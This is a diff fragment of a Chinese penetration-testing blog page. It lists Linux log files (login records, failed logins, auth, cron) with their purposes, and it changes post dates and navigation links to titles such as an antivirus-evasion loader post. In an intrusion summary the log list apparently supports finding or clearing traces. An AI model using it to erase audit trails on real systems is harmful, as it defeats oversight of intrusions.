+<img src="/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/050.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 <p>linux 日志文件：</p>
 <figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs stata">/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">run</span>/utmp 记录现在登入的用户<br><br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/wtmp 记录用户所有的登入和登出<br><br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/lastlog 记录每一个用户最后登入时间<br><br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/btmp 记录错误的登入尝试<br><br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/auth.<span class="hljs-keyword">log</span> 需要身份确认的操作<br><br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/secure 记录安全相关的日志信息<br><br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/maillog 记录邮件相关的日志信息<br><br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/message 记录系统启动后的信息和错误日志<br><br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/cron 记录定时任务相关的日志信息<br><br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/spooler 记录UUCP和<span class="hljs-keyword">news</span>设备相关的日志信息<br><br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/<span class="hljs-keyword">boot</span>.<span class="hljs-keyword">log</span> 记录守护进程启动和停止相关的日志消息<br></code></pre></td></tr></table></figure>
 
@@ -855,7 +855,7 @@
   <div class="license-box my-3">
     <div class="license-title">
       <div>内网渗透总结</div>
-      <div>http://aqiao-jashell.github.io/2024/07/26/内网渗透总结/</div>
+      <div>http://aqiao-jashell.github.io/2023/09/26/内网渗透总结/</div>
     </div>
     <div class="license-meta">
       
@@ -867,7 +867,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2024年7月26日</div>
+          <div>2023年9月26日</div>
         </div>
       
       
@@ -899,9 +899,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/04/15/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E3%80%8C%E4%B8%80%E3%80%8D-java-SE%E5%9F%BA%E7%A1%80/" title="Java代码审计基础知识「一」-- java SE基础">
+                      <a href="/2023/10/18/%E4%BB%A3%E7%90%86%E4%B8%8E%E8%BD%AC%E5%8F%91/" title="代理与转发">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Java代码审计基础知识「一」-- java SE基础</span>
+                        <span class="hidden-mobile">代理与转发</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -909,8 +909,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" title="命令执行漏洞总结">
-                        <span class="hidden-mobile">命令执行漏洞总结</span>
+                      <a href="/2023/08/12/%E8%87%AA%E5%AE%9A%E4%B9%89%E7%BC%96%E7%A0%81%E7%BC%96%E5%86%99%E5%85%8D%E6%9D%80%E5%8A%A0%E8%BD%BD%E5%99%A8/" title="自定义编码编写免杀加载器">
+                        <span class="hidden-mobile">自定义编码编写免杀加载器</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
